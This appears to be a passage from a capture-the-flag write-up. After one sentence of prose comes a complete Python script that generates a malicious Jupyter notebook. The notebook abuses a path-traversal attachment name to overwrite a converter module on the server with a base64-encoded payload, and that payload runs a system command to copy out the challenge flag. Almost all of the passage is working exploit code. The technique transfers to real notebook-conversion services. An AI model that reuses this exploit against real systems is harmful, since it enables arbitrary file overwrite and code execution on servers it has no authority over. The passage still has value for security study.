To achieve this, I created a python script which gives an exploit.ipynb

#!/usr/bin/python3 
import base64
import json

def build_hook_payload() -> str:
    return """
import os
os.system("/readflag > /srv/app/app/static/flag.txt")
""".strip()

def build_hook_notebook(payload: str) -> bytes:
    target = "../../../../app/converter/convert_job.py"
    encoded_payload = base64.b64encode(payload.encode("utf-8")).decode("ascii")
    notebook = {
        "cells": [
            {
                "cell_type": "markdown",
                "id": "hook-cell",
                "metadata": {},
                "source": [f"![hook](attachment:{target})"],
                "attachments": {
                    target: {
                        "text/plain": encoded_payload,
                    }
                },
            }
        ],
        "metadata": {},
        "nbformat": 4,
        "nbformat_minor": 5,
    }
    return json.dumps(notebook).encode("utf-8")

if __name__ == "__main__":
    payload = build_hook_payload()
    notebook_bytes = build_hook_notebook(payload)
    with open("exploit.ipynb", "wb") as f:
        f.write(notebook_bytes)
    print("Exploit notebook created: exploit.ipynb")
